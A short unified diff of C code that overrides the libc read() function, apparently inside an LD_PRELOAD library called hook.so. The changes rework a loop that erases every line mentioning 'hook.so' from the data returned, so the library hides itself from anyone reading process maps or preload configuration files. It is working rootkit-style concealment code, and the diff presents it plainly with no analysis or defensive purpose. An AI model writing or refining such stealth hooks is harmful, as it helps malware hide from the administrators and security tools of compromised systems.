@@ -8,24 +8,35 @@ ssize_t read(int fd, void *buf, size_t count) {
     ssize_t result = real_read(fd, buf, count);
 
     if (result > 0) {
+        char *start = (char *)buf;
         char *match;
-        // Loop as long as "hook.so" exists in the remaining buffer data
-        while ((match = memmem(buf, result, "hook.so", 7)) != NULL) {
-            char *start = (char *)buf;
-            char *end = start + result;
 
-            // Find start and end boundaries of the matching line
-            char *line_start = memrchr(buf, '\n', match - start);
-            line_start = line_start ? line_start + 1 : start;
+        size_t remaining = result;
 
-            char *line_end = memchr(match, '\n', end - match);
-            line_end = line_end ? line_end + 1 : end;
+        while ((match = memmem(start, remaining, "hook.so", 7)) != NULL) {
+            char *buffer_root = (char *)buf;
+            char *buffer_end = buffer_root + result;
 
-            // Completely erase the line by shifting memory
-            memmove(line_start, line_end, end - line_end);
-            result -= (line_end - line_start);
+            char *line_start = memrchr(buffer_root, '\n', match - buffer_root);
+            line_start = line_start ? line_start + 1 : buffer_root;
+
+            char *line_end = memchr(match, '\n', buffer_end - match);
+            line_end = line_end ? line_end + 1 : buffer_end;
+
+            size_t line_len = line_end - line_start;
+
+            // Shift the remaining data forward
+            memmove(line_start, line_end, buffer_end - line_end);
+
+            // Update the global result size
+            result -= line_len;
+
+            // Move the scanning pointer forward to the modification point
+            start = line_start;
+            remaining = buffer_end - line_end;
         }
     }
     return result;
 }
+
 
